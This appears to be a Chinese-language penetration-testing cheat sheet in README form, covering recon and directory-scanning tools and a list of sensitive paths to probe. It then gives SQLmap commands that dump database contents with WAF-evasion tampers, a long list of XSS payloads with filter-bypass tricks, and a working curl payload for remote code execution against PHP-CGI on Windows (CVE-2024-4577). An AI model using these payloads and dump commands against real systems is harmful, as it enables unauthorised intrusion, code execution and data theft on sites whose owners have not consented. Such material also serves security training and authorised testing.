# Hitmap-ver.1

## 掃描、資訊蒐集

### 工具
  - rustscan
    -  可快速掃出目標開了哪些 Port
    -  Kali 上面沒有，亦無法直接 apt install
    -  安裝 Step
        - Step 1. 複製網址到Kali的瀏覽器進行下載
            ```sh
            https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb
            ```
        - Step 2. 開終端機
            ```sh
            cd Downloads
            ls
            ```
        - Step 3. 把下載的檔案開啟權限
            ```sh
            sudo chmod +x rustscan_2.0.1_amd64.deb
            ```
        - Step 4. 安裝他的套件
            ```sh
            sudo dpkg -i rustscan_2.0.1_amd64.deb
            ```
        - Step 5. 完成安裝 or 出現報錯
          - 沒報錯跳過這步 
            ```sh
            sudo apt update
            sudo apt upgrade
            ```
    - **使用方法**
      ```zsh
      rustscan -a ip or domain
      ```
      ![image](https://github.com/Kazusa613732/Hitmap-ver.1/blob/main/img/rustscan1.png)
      
  - nmap
    - **使用方法**
      - 作業系統、服務版本
        ```sh
         nmap -A ip or domain
        ```
      - 指定port
        ```sh
         nmap -A -p22,80,1000 ip
        ```
      - 很多...未來待補
        
  - nuclei
    -  弱掃工具（效果待確）
    -  Kali 上面沒有，可直接 sudo apt install nuclei
    -  **使用方法**
        ```sh
        nuclei -u url 
        ```
  - Wappalyzer（Chrome插件）
    -  可以看到網站是用那些框架、套件、部分版本
  - DotGit（Chrome插件）
    -  可以偵測到有沒有.git洩漏
    -  有的話，可以透過 Kali 安裝 Githack 來查看
    -  安裝
       ```sh
       git clone https://github.com/lijiejie/GitHack.git
       ```
    - **使用方法**
        ```sh
        python Githack.py URL/.git
        ```
## 目錄爆破

### 工具
  - dirsearch
    - Kali 上沒有，可自行安裝
      ```sh
      sudo apt install dirsearch
      ```
    - **使用方法**
      ```sh
       dirsearch -u "url"
      ```
  - gobuster
    - Kali 上沒有，可自行安裝
      ```sh
      sudo apt install gobuster
      ```
    - **使用方法**
      - 待補
### 不該出現的頁面
  - .env
  - phpinfo
  - .git
  - CKfinder
  - cgi-bin
  - upload.php（進去看有沒有可以try的點）
  - login.php（進去看有沒有可以try的點）
  - .svn
  - etc..
  - 感覺奇怪的都去看

## Injection
### CRLF injection
  - [筆記](https://www.notion.so/CRLF-Injection-1b9997876c1380e4bc7cccad27ecd62f?pvs=4)
### SQL injection
  - [筆記](https://www.notion.so/SQL-Injection-1ba997876c138098bed3c44d005558b3?pvs=4)
  - 最最基本檢測方式
    - 在參數後輸入'進行測試，出現報錯、500error，基本上可以直接用SQLmap進行確認了
    - 利用不同編碼bypass
    - 'AND1=1，可測錯誤注入、盲注
  - SQLmap
    - **指令**
        ```sh
        #可以dump出所有資料庫名稱
        sqlmap -u “url” --random-agent --tamper space2comment,space2hash,space2mssqlhash --dbs
        #可以dump某一資料庫的資料表
        sqlmap -u “url” --random-agent --tamper space2comment,space2hash,space2mssqlhash -D dbs名稱 --tables
        #可以dump出某一資料庫、資料表的欄位
        sqlmap -u “url” --random-agent --tamper space2comment,space2hash,space2mssqlhash -D dbs名稱 -T tb名稱 --columns
        #可以dump出某一資料庫、資料表的欄位內容
        sqlmap -u “url” --random-agent --tamper space2comment,space2hash,space2mssqlhash -D dbs名稱 -T tb名稱 -C c欄,c欄 --dump
        #其他參數
        --delay 1（延遲一秒）、--level 1~5、--risk 1~5（更多注入手段會更久）
        ```
  ### XSS
   - 常見Payload
       ```js
         #Basic
        <script>alert('XSS')</script>
        <scr<script>ipt>alert('XSS')</scr<script>ipt>
        "><script>alert('XSS')</script>
        "><script>alert(String.fromCharCode(88,83,83))</script>
        <script>\u0061lert('22')</script>
        <script>eval('\x61lert(\'33\')')</script>
        <script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
        <object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
        
        #img
        <img src=x onerror=alert('XSS');>
        <img src=x onerror=alert('XSS')//
        <img src=x onerror=alert(String.fromCharCode(88,83,83));>
        <img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
        <img src=x:alert(alt) onerror=eval(src) alt=xss>
        "><img src=x onerror=alert('XSS');>
        "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
        <><img src=1 onerror=alert(1)>
        
        #svg
        <svgonload=alert(1)>
        <svg/onload=alert('XSS')>
        <svg onload=alert(1)//
        <svg/onload=alert(String.fromCharCode(88,83,83))>
        <svg id=alert(1) onload=eval(id)>
        "><svg/onload=alert(String.fromCharCode(88,83,83))>
        "><svg/onload=alert(/XSS/)
        <svg><script>alert('33')
        <svg><script>alert&lpar;'33'&rpar;
        
        #div
        <div onpointerover="alert(45)">MOVE HERE</div>
        <div onpointerdown="alert(45)">MOVE HERE</div>
        <div onpointerenter="alert(45)">MOVE HERE</div>
        <div onpointerleave="alert(45)">MOVE HERE</div>
        <div onpointermove="alert(45)">MOVE HERE</div>
        <div onpointerout="alert(45)">MOVE HERE</div>
        <div onpointerup="alert(45)">MOVE HERE</div>
       ```
  ### XXE Injection
  ## CVE 2024-4577
  - 此弱點影響安裝於 Windows 作業系統上所有的 PHP 版本
    - PHP 8.3 < 8.3.8
    - PHP 8.2 < 8.2.20
    - PHP 8.1 < 8.1.29
  - 常見之 Apache HTTP Server 加上 PHP 組合
  - 所有版本的 XAMPP for Windows 安裝也預設受此弱點影響
  - **Payload&RCE**
      ```sh
      curl -o - "URL/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" --data '<?=`whoami & dir`;die();?>'
      ```
  - PoC
      ```sh
      https://github.com/watchtowrlabs/CVE-2024-4577
      ```
## LFI

## RF&一堆教材文件
 - https://github.com/swisskyrepo/PayloadsAllTheThings
